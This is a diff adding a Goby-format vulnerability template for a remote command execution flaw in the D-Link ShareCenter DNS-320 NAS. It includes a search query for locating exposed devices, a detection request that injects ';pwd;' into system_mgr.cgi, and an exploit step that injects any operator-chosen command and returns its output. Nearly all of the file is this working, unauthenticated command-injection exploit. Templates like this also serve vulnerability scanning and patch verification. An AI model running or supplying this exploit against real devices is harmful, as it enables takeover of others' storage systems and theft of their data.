@@ -1,0 +1,99 @@
+{
+      "Name": "D-Link ShareCenter DNS-320 RCE",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "app=\"D_Link-DNS-ShareCenter\"",
+      "Description": "D-Link is a global leader in designing and developing networking and connectivity products for consumers, small businesses, medium to large-sized enterprises, and service providers.",
+      "Product": "D-Link ShareCenter DNS-320",
+      "Homepage": "https://www.dlink.com/",
+      "Author": "",
+      "Impact": "D-Link ShareCenter DNS-320 system_mgr.cgi has a RCE.",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Cmd",
+                  "Type": "input",
+                  "Value": "ls"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;pwd;",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "var/www",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;{{{Cmd}}};",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "var/www",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|undefined|undefined"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
